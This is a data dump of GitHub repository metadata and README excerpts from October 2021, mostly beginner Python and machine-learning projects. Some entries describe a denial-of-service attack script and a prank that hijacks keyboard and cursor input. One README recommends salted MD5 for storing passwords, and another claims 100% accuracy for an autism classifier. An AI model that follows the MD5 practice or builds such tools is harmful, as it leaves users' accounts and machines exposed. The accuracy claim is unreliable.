417070195;Cartoonization;https://github.com/Nish251103/Cartoonization;Python;2021-10-14T09:33:04Z;0;0;0;Cartoonization A program which converts real-life pictures into practical cartoon scenes. Developed using one of the most famous python's framework OpenCV. 
417052211;InCal_notebooks;https://github.com/barel-mishal/InCal_notebooks;Jupyter Notebook;2021-10-14T08:36:00Z;0;0;0;
417054930;online_dict;https://github.com/Ming1617/online_dict;Python;2021-10-14T08:45:18Z;1;1;0;"在线词典 两级页面， 可以实现用户的注册与登录存储至数据库加密 可以实现对单词的查询和查看历史记录等功能 由server端和client组成 采用mysql为存储仓库 dict数据库下有三个表： words（id,word,mean） user(id,name,passwd) hist(id,name,word,time) words 为文件 dict.txt 存入：exc.py 1.确定好技术方案（套接字，并发，细节确定） * tcp套接字 * process多进程 * 历史记录：前10条 * 注册成功  直接登录  2.数据表进行建立（dict:wrods） * 用户  user —> id name passwd  	create table user(id int primary key auto_increment,name varchar(32) not null, 	passwd varchar(128) not null);  	 * 历史记录 hist —> id name word time  	create table hist(id int primary key auto_increment,name varchar(32) not null, 	word varchar(28) not null,time datetime default now());  3.结构设计：几个模块 封装设计 客户端  服务端：逻辑请求处理，数据库操作处理  函数封装：直接写一个功能程序提供给使用者使用。使用者直接允许，而不是需要使用我的代码的某一部分。  4.功能分析 和 通信搭建 * 网络搭建 * 注册 * 登录 * 查单词 * 历史记录  5.罗列功能逻辑（每个功能确定服务端和客户端该做什么，编写代码测试） 注册	客户端：  输入注册信息 发送请求给服务器 得到服务器反馈 	 服务端：  接受请求 		判断是否允许注册 		允许注册将信息存入数据库 		给客户端反馈结果  登录	客户端：  输入用户名密码 	               发送请求给服务器 	               得到服务器反馈  	 服务端：  接受请求 		判断是否允许登录 		发送结果  查单词	 客户端：  输入单词 		发送请求 		等待接受结果  	 服务端：  接受请求 		查找单词 		发送结果 		插入历史记录  历史记录     客户端：  6.设定客户端服务端请求协议 注册	R  登录	L  查单词	Q	  历史记录	H  退出	E  cookie: import getpass getpass.getpass() 功能:　隐藏输入内容 参数:  提示行 进行密码加密 In [3]: import hashlib In [4]: passwd = 'abc123' 生成加密对象 hash = hashlib.md5() hash = hashlib.md5(b""#-the,L"")　＃ 加盐处理 进行密码加密 In [6]: hash.update(passwd.encode()) 获取加密后的内容 In [7]: hash.hexdigest() "
417083099;Autism-spectrum-classification;https://github.com/tomaszsmaruj25/Autism-spectrum-classification;Python;2021-10-14T10:16:52Z;0;0;0;Autism-spectrum-classification 1. The aim of the project The project task was to implement a model in the python language for predicting the autism spectrum in children. Data from the website were used for this task: https://archive.ics.uci.edu/ml/datasets/Autistic+Spectrum+Disorder+Screening+Data+for+Children++ The dataset used had a total of 292 different patient outcomes for 19 variables. Based on the knowledge of machine learning and neural networks, it was necessary to prepare the data, and then create and learn a model and test it on unused data. 2. Libraries used For the python 3.6 interpreter:  scipy - for importing data from a file, numpy - for mathematical operations on columns, pandas - for storing and processing data in tables, pandasgui - to display results in tables, tensorflow and keras - libraries used for machine learning, sklearn - data processing and creation of performance metrics.  Note: The versions of individual libraries can be found in the requirements.txt file 3. Setup environment a) with Anaconda Anaconda is a great program for creating virtual environments. It makes it much easier to work with different projects and versions of libraries. To run this project, it is recommended to create a new environment and follow the methods given below: We run the anaconda-promt program. Once in the (base) environment, enter the commands as below: Create a conda environment conda create -n robmed-env  Activation of environment conda activate robmed-env  Installing libraries (go to the directory where the project folder is located): conda install --file requirements.txt  Launch the script python main.py  If the script was successfully run, the model training process will start. There will also be a table showing how the model performed on the test data. In addition, in the folder in the Models directory there will be a ready trained model. Note: If you used a terminal and would like to display the data in the pandasgui tables (commented out by default), you may run into an error. So it is recommended to use programs like Pycharm or Spyder when we want to use this library and edit the code. b) using Pycharm We launch Pycharm and create a new project. We choose the base python interpreter. It is important that this is the python 3.6 version. Additionally, we create a new virtual environment (if you have already completed the step with creating the conda environment, we can use it here).  We move the contents of the Autism_Classification folder to the project folder and open the main.py file. To install the libraries we open a terminal and then use the command: pip install -r requirements.txt  At this point, we can already run the program in the pycharm environment. 4. Code overview a) Data preparation The data retrieved from the page is located in the dataset folder in the Autism-Child-Data.arff file. Therefore, they should be transferred to the program variables. The scipy library and the arff.loadarff method were used to load the data. After loading the data, you had to use the pandas library and decode the data to the utf-8 format. Below is a table of already loaded variables.  In order to create a network and to best learn a model, important data must be properly processed and unnecessary columns should be removed. Removed columns:  Age group - it was exactly the same for all children. The variable could be used for a larger database of different age groups. However, this information was useless for this problem. Country of residence, nationality, application used - when training the model, it turned out that these parameters did not affect the learning outcomes. The effects of these variables were investigated, but their use could only worsen the results. Autism - this column has also been removed because this parameter is our value that we want to predict. So it had to be placed in a different buffer.  Processed columns:  Gender, jaundice, ASD - men / woman and yes / no values have been changed to 1 and 0, Relatives - values changed to Parent - 0, self - 1, Health Care profesional -2,? - 3.  The finished data set for the student was divided as follows: Total data size: 292 Train data size: 183 Valid data size: 21 Data size test: 88    Total data size: 292     Train data size: 183   Valid data size: 21   Data size test: 88    Prepared table of variables for learning.  b) Training the model. Once the data had been prepared, the model creation could begin. model = Sequential() model.add(Dense(14, input_dim=14, activation='relu')) model.add(Dense(8, activation='relu')) model.add(Dense(1, activation='sigmoid')) model.compile(loss='binary_crossentropy', optimizer='adam', metrics=['accuracy'])  The model was declared sequential. The neurons in the input layer had a value equal to the number of parameter columns. Additionally, one hidden layer consisting of 8 neurons and the relu activation function was used. The output layer returned the logical value of the parameter, i.e. 1 - for autism and 0 - none. 50 epochs were used for teaching. The results that were obtained are listed below Epoch 50/50 - 0s - loss: 0.0261 - acc: 1.0000 - val_loss: 0.0231 - val_acc: 1.0000  Already after 15 epochs, the accuracy of the model was 100%, but the number of epochs was increased due to the high value of the loss function, which only after 50 epochs remained at the level of about 2.5%. c) Model testing. The model was used on previously unused test data. The performance metric was used to visualize the effectiveness:    - precision recall f1-score support     avg / total 1.00 1.00 1.00 88    A good result was obtained for 100% of the data, which proves the high accuracy of the network. 
417183745;dur2work;https://github.com/toammann/dur2work;Python;2021-10-14T15:26:20Z;0;0;0;dur2work A python script that collects the travel duration of a route request from the googlemaps duration API and writes the result in a SQLite database. 
417165631;thewall;https://github.com/minh832000/thewall;HTML;2021-10-14T14:36:50Z;0;0;0;
417158351;Diabetes-disease-prediction;https://github.com/AhmedMMahrous/Diabetes-disease-prediction;Jupyter Notebook;2021-10-14T14:17:17Z;0;0;0;Diabetes-disease-prediction 
417166967;Web-scraping-and-parsing;https://github.com/nkeyan11/Web-scraping-and-parsing;Python;2021-10-14T14:40:35Z;0;0;0;Web-scraping-and-parsing Web scraping and parsing project using URLlib and regex in python, where customer names and   addresses from the website is parsed using regex and stored locally in a text file. 
417131347;Auto-Attendance-Using-Face-Recognition;https://github.com/Uppalurianirudh/Auto-Attendance-Using-Face-Recognition;Python;2021-10-14T12:59:18Z;0;0;0;
417116770;GUI-Automation;https://github.com/emresahinuk/GUI-Automation;;2021-10-14T12:13:26Z;0;0;0;"GUI-Automation This repository showcases the alghoritms designed to automate the 3rd party software which Gas and Energy industry uses through Graphical User Interface Autamation with the Python Libraries of PyAutoGUI and Time Mouse coordinates will be updated real time with this alghorithm to find and use relavant pixels; https://github.com/emresahinuk/GUI-Automation/blob/main/Pyautogui/Mouse%20Coordinates Electric Meter Exchange will be automated from an Excel File to the 3rd Party Industry Standart Software with this alghorithm; https://github.com/emresahinuk/GUI-Automation/blob/main/Pyautogui/Electric%20Meter%20Exchange "
417072290;web_scraping;https://github.com/LanVu97/web_scraping;Jupyter Notebook;2021-10-14T09:40:00Z;0;0;0;
417048134;solve-example;https://github.com/Huxill/solve-example;;2021-10-14T08:23:08Z;1;1;0;solve-example Hi, I am a developer from Russia, I am learning python and out of boredom I created this code, if you have any questions, please contact Discord: HARXI # 0460 
417109931;ProcessTree;https://github.com/sbc0d/ProcessTree;HTML;2021-10-14T11:51:18Z;0;0;0;ProcessTree Process chaining is something which every blueteamer does when they are dealing with process logs. This python utility takes in a csv file and produces a graphical representation of the processes that were executed This tool will take csv as an input and will display a displays a graphical representation of the process chaining. Author: Satheesh Balaji Twitter: https://twitter.com/sbc0d LinkedIn: https://www.linkedin.com/in/sb-c0d3 INPUTS: The program takes a csv as an input. The file should have the below fields. It can have other fields as well. A sample file 4688.csv is attached. Input file format: The csv should have the below column names 'TimeCreated'       - The date time field at which the process was created. Make sure the file is sorted in ASC based on this column. 'ProcName'          - Name of the created process 'ProcessId'         - Process of the created process 'ProcPath'          - Path of the created process 'ParentProcessName' - Name of the parent process 'ParentProcessId'   - Process ID of the parent process 'CommandLine'       - Command Line of the created process 'TokenElevationType'- TokenElevationType of the process 'SubjectDomainName' - Domain name of the user account which created the process 'SubjectUserName'   - Name of the account which created the process 'SubjectLogonId'    - Logon ID of the user which created the process More details about Event ID: 4688 OUTPUT: A html file, that contains the graphical representation of the data.  A popup with more details will appear when mouse is hovered over a node.  
417063364;BookS-Library;https://github.com/buraLimit/BookS-Library;Python;2021-10-14T09:12:33Z;0;0;0;
417115541;ProgramsPy;https://github.com/Swapnil-11-04-01/ProgramsPy;TeX;2021-10-14T12:09:17Z;1;1;0;
417056284;Encryption-decryption;https://github.com/Sakshi-77/Encryption-decryption;;2021-10-14T08:49:30Z;0;0;0;
417168093;Restaurant-Management-System;https://github.com/nkeyan11/Restaurant-Management-System;Python;2021-10-14T14:43:40Z;0;0;0;Restaurant-Management-System Desktop app for “Restaurant Management System” using python Tkinter module. Project involves the dynamic ability to switch between tables for orders, with separate file writes for kitchen orders and final bill for the customers for the respective table orders. Database integration into local Mysql DB for storing the bill data for each order. 
417147541;carrefour_pandas;https://github.com/robertosa13/carrefour_pandas;Jupyter Notebook;2021-10-14T13:46:44Z;0;0;0;
417131257;predicting-fake-news;https://github.com/nyimasharima/predicting-fake-news;Jupyter Notebook;2021-10-14T12:59:01Z;0;0;0;predicting-fake-news Predicting fake news using several machine learning classification models in Python. The data used in this project (Big Data Challenge Competition) consists of 4231 observations / content that has been identified as whether it is a hoax or not according to TurnBackHoax.id. Each content has information consisting of text / narrative information, the image, and the status label. 
417114884;Supplement-Sales-Prediction;https://github.com/vineetpatel725/Supplement-Sales-Prediction;Jupyter Notebook;2021-10-14T12:07:17Z;0;0;0;Supplement Sales Prediction Forecast sales for 350+ supplement retail chain stores for next 2 months. Description Your Client WOMart is a leading nutrition and supplement retail chain that offers a comprehensive range of products for all your wellness and fitness needs. WOMart follows a multi-channel distribution strategy with 350+ retail stores spread across 100+ cities. Effective forecasting for store sales gives essential insight into upcoming cash flow, meaning WOMart can more accurately plan the cashflow at the store level. Sales data for 18 months from 365 stores of WOMart is available along with information on Store Type, Location Type for each store, Region Code for every store, Discount provided by the store on every day, Number of Orders everyday etc. Your task is to predict the store sales for each store in the test set for the next two months. Data Dictionary Train Data Variable Definition ID Unique Identifier for a row Store_id Unique id for each Store Store_Type Type of the Store Location_Type Type of the location where Store is located Region_Code Code of the Region where Store is located Date Information about the Date Holiday If there is holiday on the given Date, 1 : Yes, 0 : No Discount If discount is offered by store on the given Date, Yes/ No #Orders Number of Orders received by the Store on the given Day Sales Total Sale for the Store on the given Day Test Data Variable Definition ID Unique Identifier for a row Store_id Unique id for each Store Store_Type Type of the Store Location_Type Type of the location where Store is located Region_Code Code of the Region where Store is located Date Information about the Date Holiday If there is holiday on the given Date, 1 : Yes, 0 : No Discount If discount is offered by store on the given Date, Yes/ No. Algorithm I have created this project in different algorithms. The accuracy of the project varies according to the algorithm. Below, are the listed algorithms that i have used in the project. Among them the XGboost have the highest accuracy which is 82.57%.   XGBoost Random Forest Extra Tree Decision Tree K-NN Linear Regression   Directory Structure ├── Supplement Sales Prediction │   ├── Supplement Sales Prediction.ipynb         # Prediction .ipynb file │   ├── TEST_FINAL.csv                            # Dataset for Test │   └── TRAIN.csv                                 # Dataset for Train  
417101211;question-answering-squad;https://github.com/claudio-bon/question-answering-squad;Jupyter Notebook;2021-10-14T11:21:05Z;0;0;0;question-answering-squad In this project it has been finetuned a DistilBERT model over SQuAD dataset using HuggingFace library. 
417118810;DNA-Analysis;https://github.com/kungfuchamp/DNA-Analysis;;2021-10-14T12:20:08Z;0;0;0;
417304263;djavue-python-brasil;https://github.com/buserbrasil/djavue-python-brasil;Python;2021-10-14T22:52:31Z;8;8;2;djavue-python-brasil Repositório de código de curso de Djavue ministrado na Python Brasil 2021 Completamente baseado no curso Djavue. A diferença está em usar o template djavue2 Passos a seguir:  Para instalação no WSL2 com Ubuntu 20.04: Script de setup Instalação do vue-cli: npm install -g vue-cli vue init evolutio/djavue2 djavue-python-brasil Carregando comandos: source dev.sh rodar comando dkbuild Ao rodar esse comando, houve problemas porque o diretório /run/nginx já existia. Solução foi usar a opção -p no comando mkdir do Dockerfile Rodar comando para instalar dependências de frontend: dknpminstall Esse comando deu problemas por permissão. Entrei na pasta frontend e rodei o comando nvm use 14 depois npm ci para instalar dependências do node. Depois disso rodei dkup e funcionou a tela inicial do nuxt acessando localhost Criei o virtualenv: python -m venv .venv Ativei o virtualenv: source .venv/bin/activate Instalei as dependências: pip install -r requirements.txt Rodei as migraçoes: python manage.py migrate Criei um superuser: python manage.py createsuperuser Acessei localhost/admin e consegui logar com o usuário  
417210599;Python-Games;https://github.com/mrlifewarior2/Python-Games;;2021-10-14T16:48:07Z;0;0;2;
417216044;python;https://github.com/tatohh/python;;2021-10-14T17:04:24Z;0;0;0;
417285628;python;https://github.com/rocketseat-experts-club/python;Jupyter Notebook;2021-10-14T21:21:02Z;0;0;0;Conteúdo em Python 
417255821;Python;https://github.com/lisa-chen-58/Python;Python;2021-10-14T19:20:26Z;0;0;0;
417274517;Python;https://github.com/Georocha/Python;Python;2021-10-14T20:33:53Z;0;0;0;
417202609;Python;https://github.com/omarii20/Python;;2021-10-14T16:22:14Z;0;0;0;
417279463;Python;https://github.com/MauroBustos/Python;;2021-10-14T20:54:58Z;0;0;0;Python Python learning exercises 
417261237;Python;https://github.com/AbhilashPJ/Python;Jupyter Notebook;2021-10-14T19:41:24Z;0;0;0;
417308252;python;https://github.com/raulhrrr/python;Python;2021-10-14T23:13:17Z;0;0;0;
417289001;python;https://github.com/rafaelrodriguesaceno/python;Python;2021-10-14T21:36:46Z;0;0;0;A sample Python project  A sample project that exists as an aid to the Python Packaging User Guide's Tutorial on Packaging and Distributing Projects. This project does not aim to cover best practices for Python project development as a whole. For example, it does not provide guidance or tool recommendations for version control, documentation, or testing. The source for this project is available here. Most of the configuration for a Python project is done in the setup.py file, an example of which is included in this project. You should edit this file accordingly to adapt this sample project to your needs.  This is the README file for the project. The file should use UTF-8 encoding and can be written using reStructuredText or markdown with the appropriate key set. It will be used to generate the project webpage on PyPI and will be displayed as the project homepage on common code-hosting services, and should be written for that purpose. Typical contents for this file would include an overview of the project, basic usage examples, etc. Generally, including the project changelog in here is not a good idea, although a simple “What's New” section for the most recent version may be appropriate. 
417212732;python;https://github.com/carlinhosalma/python;;2021-10-14T16:54:45Z;0;0;0;
417260119;Python;https://github.com/Telefonica95/Python;Python;2021-10-14T19:36:48Z;0;0;0;
417207660;Python;https://github.com/KiranDudhane/Python;Python;2021-10-14T16:38:46Z;0;0;0;
417291903;python;https://github.com/Rogelio-42/python;Python;2021-10-14T21:51:00Z;0;0;0;
417216677;python;https://github.com/Patil1703/python;;2021-10-14T17:06:23Z;0;0;0;
417247446;python;https://github.com/AlekseyRepkin/python;;2021-10-14T18:50:56Z;0;0;0;
417310421;Python;https://github.com/andersonjake1988/Python;Python;2021-10-14T23:26:02Z;0;0;0;
417197455;python;https://github.com/Ajaykr20/python;;2021-10-14T16:06:45Z;0;0;0;python All course for python basic to advance 
417311007;Python;https://github.com/oheunji05/Python;Python;2021-10-14T23:29:24Z;0;0;0;
417257325;python;https://github.com/Ahdriy/python;;2021-10-14T19:26:01Z;0;0;0;
417206628;python;https://github.com/MoCKuT/python;;2021-10-14T16:35:26Z;0;0;0;python 
417253499;Python;https://github.com/Souza172890/Python;Python;2021-10-14T19:11:45Z;0;0;0;#Python 
417228688;Python;https://github.com/anubhavag01/Python;Jupyter Notebook;2021-10-14T17:45:58Z;0;0;0;Python #I will be working on various Python projects and will be adding the code for the same 
417203041;Python;https://github.com/MarkyMarcus/Python;Python;2021-10-14T16:23:40Z;0;0;0;Python 
417285938;Python;https://github.com/8deadlyjoker/Python;Jupyter Notebook;2021-10-14T21:22:29Z;0;0;0;Python Python is an interpreted high-level general-purpose programming language. 
417204606;python;https://github.com/GrandeDev/python;Python;2021-10-14T16:28:54Z;0;0;0;python 
417203008;python;https://github.com/melgabay/python;;2021-10-14T16:23:33Z;0;0;0;
417255523;Python;https://github.com/NTT-97/Python;Python;2021-10-14T19:19:18Z;0;0;0;Python 
417217159;python-scientific-calc-withUI;https://github.com/syn2k/python-scientific-calc-withUI;Python;2021-10-14T17:07:55Z;0;0;2;Scientific calculator made to learn python with UI. 
417206833;python1-oct2021;https://github.com/dgarhdez/python1-oct2021;Jupyter Notebook;2021-10-14T16:36:03Z;2;2;0;python1-oct2021 Repository containing all the notebooks and material that I followed in the classes SESSION 1: Intro to Jupyter and Python SESSION 2: Variables and types SESSION 3: Strings, lists and tuples SESSION 4: Conditionals and loops SESSION 5: Exercises and practice SESSION 6: User-defined functions SESSION 7: Dictionaries and sets SESSION 8: List, dictionary, and set comprehensions SESSION 9: OS, context manager, file handling SESSION 10: Work on 5 selected Project Euler problems using the concepts learned so far SESSION 11: Discussion of the solution of the selected Project Euler problems (part I) SESSION 12: Discussion of the solution of the selected Project Euler problems (part II) SESSION 13: Manipulation of JSON data SESSION 14: Work on JSON data SESSION 15: The basics of NumPy arrays SESSION 16: Arithmetic operations and comparisons and boolean logic SESSION 17: Masks for data filtering SESSION 18: N-dimensional data SESSION 19: Work on NumPy arrays 
417210736;More-python-Practicwe;https://github.com/Joshfishman97/More-python-Practicwe;Python;2021-10-14T16:48:32Z;2;2;0;More-python-Practicwe 
417265026;kingdom-python-core;https://github.com/t10d/kingdom-python-core;Python;2021-10-14T19:56:11Z;2;2;0;"🏰 Kingdom Core Library containing the core modules for the kingdom-python-server. Installation Use the package manager pip to install kingdom-core. pip install kingdom-core You can use poetry as well. poetry add kingdom-core Usage from kingdom_core.utils import files  orm_files = files.find(""orm.py"", ""/"") Contributing Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change. Please make sure to update tests as appropriate. License MIT  This file is based on Make a README.  "
417310887;PythonInterpreter;https://github.com/LyraMakes/PythonInterpreter;C#;2021-10-14T23:28:46Z;0;0;0;
417294789;PythonAPI;https://github.com/mariarobertap/PythonAPI;Python;2021-10-14T22:04:15Z;0;0;0;PythonAPI learning to do a API in python 
417272686;pythonExercise;https://github.com/SabrinadeSousa/pythonExercise;Python;2021-10-14T20:26:37Z;0;0;0;pythonExercise Meu primeiro repositório.  Exercicios de lógica de programação com a linguagem Python.  
417312799;PythonPractice;https://github.com/ITlligent/PythonPractice;;2021-10-14T23:39:30Z;0;0;0;PythonPractice 
417287903;PythonDevs;https://github.com/dfarfanve/PythonDevs;;2021-10-14T21:31:32Z;0;0;0;
417290810;pythonFun;https://github.com/karelWeingart/pythonFun;Python;2021-10-14T21:45:28Z;0;0;0;pythonFun ruleOfLife.py -> Conway's Game of Life 
417248902;PythonBelgrade;https://github.com/PythonBalkan/PythonBelgrade;;2021-10-14T18:56:11Z;0;0;0;
417209631;pythontest1;https://github.com/onkarkundargi/pythontest1;Python;2021-10-14T16:45:03Z;0;0;0;pythontest1 
417269728;PythonBelt;https://github.com/Cars0nLee/PythonBelt;Python;2021-10-14T20:14:20Z;0;0;0;PythonBelt 
417229200;pythonProjects;https://github.com/tiagosilva11/pythonProjects;Python;2021-10-14T17:47:44Z;0;0;0;
417269250;python2021;https://github.com/hprsd/python2021;;2021-10-14T20:12:24Z;0;0;1;
417212563;pythonzadania1;https://github.com/JakubSyperek/pythonzadania1;Python;2021-10-14T16:54:10Z;0;0;0;
417282992;pythonAlgo;https://github.com/jetsPepito/pythonAlgo;Python;2021-10-14T21:08:59Z;0;0;0;
417231349;Python1;https://github.com/IraV-Sudo/Python1;Jupyter Notebook;2021-10-14T17:55:08Z;0;0;0;Python1 
417268972;pythonProject;https://github.com/ibisovrauf/pythonProject;;2021-10-14T20:11:18Z;0;0;0;
417271165;PythonExercicios;https://github.com/RodriguesLucas/PythonExercicios;;2021-10-14T20:20:27Z;0;0;0;PythonExercicios 
417204656;pythonGUI;https://github.com/codeByAnees/pythonGUI;Python;2021-10-14T16:29:06Z;0;0;0;pythonGUI 
417231996;Python2;https://github.com/IraV-Sudo/Python2;Jupyter Notebook;2021-10-14T17:57:06Z;0;0;0;Python2 
417293033;Python2021;https://github.com/RyanYZ/Python2021;;2021-10-14T21:56:02Z;0;0;0;Python2021 
417269491;pythonProject;https://github.com/pantuev/pythonProject;Python;2021-10-14T20:13:24Z;0;0;0;
417303396;python1;https://github.com/Midrododn/python1;Python;2021-10-14T22:48:06Z;0;0;0;python1 
417226043;PythonDevelopment;https://github.com/MarkoPavlovic95/PythonDevelopment;Jupyter Notebook;2021-10-14T17:36:59Z;0;0;0;PythonDevelopment 
417236325;PythonPY100;https://github.com/pavsta2/PythonPY100;Python;2021-10-14T18:11:39Z;0;0;0;
417269924;pythonProject1;https://github.com/ibisovrauf/pythonProject1;;2021-10-14T20:15:12Z;0;0;0;
417263751;PythonProjectIBMCourse;https://github.com/kenmoji/PythonProjectIBMCourse;Jupyter Notebook;2021-10-14T19:51:11Z;0;0;0;PythonProjectIBMCourse Mi first python project. 
417236335;PythonPY100;https://github.com/gyoscha/PythonPY100;Python;2021-10-14T18:11:39Z;0;0;0;
417197585;pythonProject8;https://github.com/Suresh789k/pythonProject8;Python;2021-10-14T16:07:10Z;0;0;0;
417273135;CMPE_131_pythonHW;https://github.com/ShehabAlnaimi/CMPE_131_pythonHW;;2021-10-14T20:28:30Z;0;0;0;CMPE_131_pythonHW 
417227486;Python2_HW1;https://github.com/Emmy18github/Python2_HW1;Jupyter Notebook;2021-10-14T17:42:07Z;0;0;0;Python2_HW1 Python2 Homework1 
417236293;PythonPY100;https://github.com/AlexGol005/PythonPY100;Python;2021-10-14T18:11:34Z;0;0;0;
417311173;pythonProject5;https://github.com/ElVi09/pythonProject5;;2021-10-14T23:30:23Z;0;0;0;
417236322;PythonPY100;https://github.com/evgeniymoskvin/PythonPY100;Python;2021-10-14T18:11:38Z;0;0;0;
417196550;pythonProject9;https://github.com/Suresh789k/pythonProject9;;2021-10-14T16:04:08Z;0;0;0;
417208646;pythonCliTool;https://github.com/AngelosAnagnostopoulos/pythonCliTool;Python;2021-10-14T16:42:06Z;0;0;0;"User Information Utility CLI A simple python3.x utility script that returns the basic user information inside a system in either JSON or csv form to a file-like object (default stdout). It takes two optional --format and --path. Any user with user_id over 1000 is considered valid and returned. Usage: hr --path path/to/file.txt  Outputs contents into file.txt.   hr --format [json,csv]      Outputs contents in corresponding format. Example Output user@host: $hr [     {         ""name"": ""username"",         ""id"": 1000,         ""home"": ""/home/username"",         ""shell"": ""/usr/bin/bash""     } ] "
417236292;PythonPY100;https://github.com/mhelll/PythonPY100;Python;2021-10-14T18:11:33Z;0;0;0;
417236998;PythonPY100;https://github.com/Irina1207/PythonPY100;Python;2021-10-14T18:13:50Z;0;0;0;
417236305;PythonPY100;https://github.com/IoannShilo/PythonPY100;Python;2021-10-14T18:11:36Z;0;0;0;
417258423;pythonProject3;https://github.com/zainabsaad00/pythonProject3;Python;2021-10-14T19:30:22Z;0;0;0;
417220904;PythonTWII_20211013;https://github.com/7107029002/PythonTWII_20211013;Python;2021-10-14T17:20:02Z;0;0;0;
417237979;PythonProject1;https://github.com/vanessacaesar/PythonProject1;;2021-10-14T18:17:19Z;0;0;0;
417291914;PythonSystemHijackedPrank;https://github.com/kieferrr/PythonSystemHijackedPrank;Python;2021-10-14T21:51:02Z;0;0;0;PythonSystemHijackedPrank python 3.9.1 This script is a simple script that stops you from being able put any sort of keyboard input in and also pulls the cursors into the center of the screen everytime you try to move it By default the key to stop it is the hashtag key, this can be changed by editing the script or just removing the stop key all together if your cruel like that however this can be over come by pressing CTRL+ALT+DEL and then stopping the process in task manager Modules py -m pip install keyboard py -m pip install pyautogui py -m pip install colorama 
417212123;pythonProject3;https://github.com/KishanRaj-Zoetis/pythonProject3;;2021-10-14T16:52:50Z;0;0;0;
417248407;PythonA-2;https://github.com/aarsharma/PythonA-2;Python;2021-10-14T18:54:31Z;0;0;0;PythonA-2 
417236318;PythonPY100;https://github.com/aleuli/PythonPY100;Python;2021-10-14T18:11:38Z;0;0;0;
417294659;freeCodeCamp_PythonCert;https://github.com/hbwalker45/freeCodeCamp_PythonCert;Python;2021-10-14T22:03:35Z;0;0;0;freeCodeCamp_PythonCert This Repo will store the 5 exercises that are helping me get my certification in Scientific Computing via Python. Hello World! 
417305699;381908-1_Remizova_Python1;https://github.com/Remizovatonya/381908-1_Remizova_Python1;Python;2021-10-14T23:00:32Z;0;0;0;381908-1_Remizova_Python1 
417256879;Screen3_With_Python3;https://github.com/josejunco/Screen3_With_Python3;Python;2021-10-14T19:24:25Z;1;1;0;
417291325;DoS-Attack-Python3;https://github.com/kieferrr/DoS-Attack-Python3;Python;2021-10-14T21:47:58Z;0;0;0;DoS-Attack-Python3 I have a second version of the denial of service attack script but its made for linux, this version is made to work on windows 
417208531;pythonbot;https://github.com/Jeevan1310/pythonbot;;2021-10-14T16:41:45Z;0;0;0;Intro to a python discord bot Hey guys i am a beginner in python when i get desire to build a discord bot in python i started learning new things 
417242570;pythonestudando;https://github.com/boechat/pythonestudando;;2021-10-14T18:33:10Z;0;0;0;pythonestudando https://www.learnpython.org/ 
417219638;pythonstudy;https://github.com/Oneplate/pythonstudy;Python;2021-10-14T17:15:44Z;0;0;0;
417276269;pythongame;https://github.com/mcgovernh/pythongame;Python;2021-10-14T20:41:31Z;0;0;0;
417257562;pythontest;https://github.com/Firehound13/pythontest;;2021-10-14T19:26:55Z;0;0;0;
417273669;pythoncgi;https://github.com/antonsamirabdu/pythoncgi;Python;2021-10-14T20:30:41Z;0;0;0;pythoncgi pythoncgi 
417225453;pythonteste;https://github.com/MauricioOliveira30/pythonteste;Python;2021-10-14T17:35:01Z;0;0;0;
417263082;pythonwork;https://github.com/Pran-programming/pythonwork;;2021-10-14T19:48:14Z;0;0;0;pythonwork 
417248744;pythonapp;https://github.com/mohaa007/pythonapp;;2021-10-14T18:55:39Z;0;0;0;
417218005;pythonbootcamp;https://github.com/juliamilosz/pythonbootcamp;;2021-10-14T17:10:44Z;0;0;0;
417309177;pythonlogging;https://github.com/xqcao/pythonlogging;;2021-10-14T23:18:39Z;0;0;0;
417215868;Hangma_Game;https://github.com/its-nasir/Hangma_Game;Python;2021-10-14T17:03:50Z;0;0;0;Hangma_Game Python 
417223849;Roman_Number;https://github.com/its-nasir/Roman_Number;Python;2021-10-14T17:29:49Z;0;0;0;Roman_Number Python 
417216653;KBC_kon-banega-karodpati;https://github.com/its-nasir/KBC_kon-banega-karodpati;Python;2021-10-14T17:06:18Z;0;0;0;KBC_kon-banega-karodpati Python 
417221472;Flames_game;https://github.com/its-nasir/Flames_game;Python;2021-10-14T17:21:59Z;0;0;0;Flames_game Python 
417222134;Login_singup;https://github.com/its-nasir/Login_singup;Python;2021-10-14T17:24:08Z;0;0;0;Login_singup Python 
417217192;Bubble_sort_game;https://github.com/its-nasir/Bubble_sort_game;Python;2021-10-14T17:08:00Z;0;0;0;Bubble_sort_game Python 
417219056;Collage_dekho_Scraping;https://github.com/its-nasir/Collage_dekho_Scraping;Python;2021-10-14T17:13:53Z;0;0;0;Collage_dekho_Scraping Python 
417223061;Meraki-Recursion-questions;https://github.com/its-nasir/Meraki-Recursion-questions;Python;2021-10-14T17:27:19Z;0;0;0;Meraki-Recursion-questions Python 
417221062;python_coursera;https://github.com/nsrodriguez/python_coursera;;2021-10-14T17:20:40Z;0;0;0;python_coursera 
417224284;imagen_python;https://github.com/fmmora/imagen_python;;2021-10-14T17:31:03Z;0;0;0;
417240216;python-files;https://github.com/immanuel-lab/python-files;;2021-10-14T18:25:01Z;0;0;0;python basics for a beginner 
417217826;python_bootcamp;https://github.com/Maciek8848/python_bootcamp;Python;2021-10-14T17:10:10Z;0;0;0;
417268167;Python-Tutorial;https://github.com/treasabency/Python-Tutorial;Jupyter Notebook;2021-10-14T20:08:02Z;0;0;0;
417243833;Dataquest_Python;https://github.com/sarahleavitt/Dataquest_Python;Jupyter Notebook;2021-10-14T18:37:31Z;0;0;0;
417299691;HW_Python;https://github.com/TaranChowdhury/HW_Python;Python;2021-10-14T22:28:48Z;0;0;0;https://github.com/TaranChowdhury/HW_Python.git 
417288218;Cursos-Python;https://github.com/Ricarss/Cursos-Python;Jupyter Notebook;2021-10-14T21:32:59Z;0;0;0;
417202244;pythonnet-stubs;https://github.com/daddycocoaman/pythonnet-stubs;Python;2021-10-14T16:21:06Z;0;0;0;pythonnet-stubs 
417244220;HOSVD-Python;https://github.com/Raelaf95/HOSVD-Python;Python;2021-10-14T18:39:01Z;0;0;0;
417306477;Python-challenges;https://github.com/mv-per/Python-challenges;Python;2021-10-14T23:03:59Z;0;0;0;Python-challenges 
417305387;python-blockchain;https://github.com/kavyaarun11/python-blockchain;;2021-10-14T22:58:48Z;0;0;0;python-blockchain 
417313781;Pi_python;https://github.com/AndressaVA/Pi_python;Python;2021-10-14T23:45:09Z;0;0;0;"Pi_python Approaching pi using random walk; python "
417204720;python--practicals;https://github.com/Lenniedr/python--practicals;Jupyter Notebook;2021-10-14T16:29:16Z;0;0;0;My solutions to the practicals of Init2py 
417286742;AluraPython;https://github.com/edutamura/AluraPython;Python;2021-10-14T21:26:16Z;0;0;0;
